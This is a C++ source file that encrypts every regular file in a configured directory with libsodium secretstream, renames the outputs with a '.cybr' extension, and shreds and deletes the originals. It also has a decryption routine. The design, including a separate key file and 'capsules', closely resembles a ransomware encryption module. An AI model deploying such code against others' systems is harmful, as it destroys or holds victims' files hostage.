/**
 * @file file_ops.cpp
 * @brief File system operations and directory processing logic with chunked streaming.
 */

#include <iostream>
#include <fstream>
#include <vector>
#include <filesystem>
#include <algorithm>
#include <sodium.h>
#include "config.hpp"

/**
 * @namespace fs
 * @brief Alias for the standard filesystem library used for path and directory operations.
 */
namespace fs = std::filesystem;

/**
 * @namespace FileOps
 * @brief File system interactions for chunked stream processing and directory traversal.
 */
namespace FileOps
{
    /**
     * Chunk size set to 4 Megabytes (4 * 1024 * 1024 bytes).
     */
    const size_t CHUNK_SIZE = 4 * 1024 * 1024;

    /**
     * @brief Corrupts the first 4KB of a file with random bytes before deleting it.
     * @param path The path to the file to be securely shredded.
     */
    void secure_shred_head(const fs::path &path)
    {
        if (!fs::exists(path))
            return;

        unsigned long long file_size = fs::file_size(path);
        if (file_size == 0)
        {
            fs::remove(path);
            return;
        }

        // Open file in-place for binary read/write without truncating
        std::fstream file(path, std::ios::binary | std::ios::in | std::ios::out);
        if (!file.is_open())
            throw std::runtime_error("Cannot open file for secure shredding: " + path.string());

        // Target only the first 4KB (4096 bytes) or less if the file is smaller
        unsigned long long overwrite_size = std::min(file_size, static_cast<unsigned long long>(4096));
        std::vector<unsigned char> shred_buf(overwrite_size);

        // Generate cryptographically secure random bytes using libsodium
        randombytes_buf(shred_buf.data(), overwrite_size);

        // Overwrite the header of the file
        file.seekp(0, std::ios::beg);
        file.write(reinterpret_cast<const char *>(shred_buf.data()), overwrite_size);
        file.flush();
        file.close();

        // Finally, remove the corrupted file from the filesystem
        fs::remove(path);
    }

    /**
     * Writes a string to a file (used for Base64 capsules).
     */
    void write_file(const fs::path &path, const std::string &data)
    {
        std::ofstream file(path);
        if (!file.is_open())
            throw std::runtime_error("Cannot write to: " + path.string());
        file << data;
    }

    /**
     * Reads file content as a string.
     */
    std::string read_file_as_string(const fs::path &path)
    {
        std::ifstream file(path);
        if (!file.is_open())
            throw std::runtime_error("Cannot open file: " + path.string());
        return std::string((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    }

    /**
     * Processes all eligible files for encryption using 4MB chunks (libsodium secretstream).
     */
    void process_encryption(const std::vector<unsigned char> &symkey)
    {
        fs::path target(Config::TARGET_DIR);
        if (!fs::exists(target))
            return;

        for (const auto &entry : fs::directory_iterator(target))
        {
            if (!entry.is_regular_file() || entry.path().extension() == Config::FILE_EXTENSION ||
                entry.path().filename() == Config::EWK_FILENAME)
                continue;

            try
            {
                // Check if file exceeds the maximum size limit before processing
                unsigned long long current_size = fs::file_size(entry.path());
                if (current_size > Config::MAX_FILE_SIZE_BYTES)
                {
                    double size_in_gb = static_cast<double>(current_size) / (1024.0 * 1024.0 * 1024.0);
                    std::cerr << "[-] Skipped: " << entry.path().filename()
                              << " (" << size_in_gb << " GB) exceeds maximum size limit!\n";
                    continue;
                }

                std::ifstream in_file(entry.path(), std::ios::binary);
                if (!in_file.is_open())
                    throw std::runtime_error("Cannot open source file");

                fs::path out_path = entry.path();
                out_path += Config::FILE_EXTENSION;
                std::ofstream out_file(out_path, std::ios::binary);
                if (!out_file.is_open())
                    throw std::runtime_error("Cannot create encrypted file");

                // Initialize libsodium's secretstream state and header
                crypto_secretstream_xchacha20poly1305_state state;
                unsigned char header[crypto_secretstream_xchacha20poly1305_HEADERBYTES];
                crypto_secretstream_xchacha20poly1305_init_push(&state, header, symkey.data());

                // Write metadata header: [Libsodium Stream Header] + [MAGIC] + [VERSION]
                out_file.write((char *)header, sizeof(header));
                out_file.write(Config::MAGIC.c_str(), Config::MAGIC.length());
                out_file.write((char *)&Config::VERSION, 1);

                std::vector<unsigned char> buffer_in(CHUNK_SIZE);
                std::vector<unsigned char> buffer_out(CHUNK_SIZE + crypto_secretstream_xchacha20poly1305_ABYTES);
                unsigned long long out_len;

                // Stream encryption loop
                while (in_file.good())
                {
                    in_file.read((char *)buffer_in.data(), CHUNK_SIZE);
                    std::streamsize bytes_read = in_file.gcount();
                    if (bytes_read == 0)
                        break;

                    // Determine if this is the final chunk of the file
                    unsigned char tag = (in_file.peek() == EOF) ? crypto_secretstream_xchacha20poly1305_TAG_FINAL
                                                                : crypto_secretstream_xchacha20poly1305_TAG_MESSAGE;

                    if (crypto_secretstream_xchacha20poly1305_push(&state, buffer_out.data(), &out_len,
                                                                   buffer_in.data(), bytes_read,
                                                                   NULL, 0, tag) != 0)
                    {
                        throw std::runtime_error("Stream encryption failed");
                    }

                    out_file.write((char *)buffer_out.data(), out_len);
                }

                in_file.close();
                out_file.close();

                // Shred the original file header before deletion if configured
                if (Config::REMOVE_ORIGINAL_FILES)
                    secure_shred_head(entry.path());

                std::cout << "[+] Encrypted: " << entry.path().filename() << "\n";
            }
            catch (const std::exception &e)
            {
                std::cerr << "[-] Failed: " << entry.path().filename() << " (" << e.what() << ")\n";
            }
        }
    }

    /**
     * Processes all .cybr files for decryption using 4MB chunks (libsodium secretstream).
     */
    void process_decryption(const std::vector<unsigned char> &symkey)
    {
        fs::path target(Config::TARGET_DIR);
        if (!fs::exists(target))
            return;

        for (const auto &entry : fs::directory_iterator(target))
        {
            if (!entry.is_regular_file() || entry.path().extension() != Config::FILE_EXTENSION)
                continue;

            try
            {
                std::ifstream in_file(entry.path(), std::ios::binary);
                if (!in_file.is_open())
                    throw std::runtime_error("Cannot open encrypted file");

                // Initialize state and read the stream header
                crypto_secretstream_xchacha20poly1305_state state;
                unsigned char header[crypto_secretstream_xchacha20poly1305_HEADERBYTES];
                in_file.read((char *)header, sizeof(header));

                if (in_file.gcount() != sizeof(header))
                    throw std::runtime_error("Invalid or missing stream header");

                if (crypto_secretstream_xchacha20poly1305_init_pull(&state, header, symkey.data()) != 0)
                    throw std::runtime_error("Invalid stream header authentication");

                // Read and validate original metadata [MAGIC] + [VERSION]
                std::vector<char> magic_buf(Config::MAGIC.length());
                in_file.read(magic_buf.data(), Config::MAGIC.length());
                unsigned char version_val;
                in_file.read((char *)&version_val, 1);

                if (std::string(magic_buf.data(), magic_buf.size()) != Config::MAGIC || version_val != Config::VERSION)
                    throw std::runtime_error("Metadata header mismatch (Integrity error)");

                fs::path out_path = entry.path();
                out_path.replace_extension(""); // Remove .cybr
                std::ofstream out_file(out_path, std::ios::binary);
                if (!out_file.is_open())
                    throw std::runtime_error("Cannot create decrypted destination file");

                // Input buffer needs space for the cipher chunk + authentication tag overhead
                std::vector<unsigned char> buffer_in(CHUNK_SIZE + crypto_secretstream_xchacha20poly1305_ABYTES);
                std::vector<unsigned char> buffer_out(CHUNK_SIZE);
                unsigned long long out_len;
                unsigned char tag;

                // Stream decryption loop
                while (in_file.good())
                {
                    // Read expected ciphertext block size
                    in_file.read((char *)buffer_in.data(), CHUNK_SIZE + crypto_secretstream_xchacha20poly1305_ABYTES);
                    std::streamsize bytes_read = in_file.gcount();
                    if (bytes_read == 0)
                        break;

                    if (crypto_secretstream_xchacha20poly1305_pull(&state, buffer_out.data(), &out_len, &tag,
                                                                   buffer_in.data(), bytes_read,
                                                                   NULL, 0) != 0)
                    {
                        throw std::runtime_error("Stream decryption failed (Auth/Integrity error)");
                    }

                    out_file.write((char *)buffer_out.data(), out_len);

                    if (tag == crypto_secretstream_xchacha20poly1305_TAG_FINAL)
                        break; // End of secure stream reached successfully
                }

                in_file.close();
                out_file.close();

                fs::remove(entry.path());
                std::cout << "[+] Decrypted: " << out_path.filename() << "\n";
            }
            catch (const std::exception &e)
            {
                std::cerr << "[-] Integrity error: " << entry.path().filename() << " (" << e.what() << ")\n";
            }
        }
    }
}